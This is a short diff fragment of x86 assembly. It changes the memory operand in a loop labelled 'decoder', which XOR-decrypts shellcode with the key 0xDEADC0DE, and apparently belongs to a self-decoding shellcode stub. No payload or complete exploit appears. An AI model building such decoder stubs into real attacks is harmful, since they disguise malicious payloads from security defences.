@@ -15,7 +15,7 @@ myEIP :
 		xor ecx , ecx 
 		
 decoder:	
-	        mov eax , dword ptr [shellcode + ecx]	 
+	        mov eax , dword ptr [edx  + ecx]	 
                 xor eax , 0xDEADC0DE  //decrypt 
                 mov ebx ,  edx
 		add ebx , ecx 
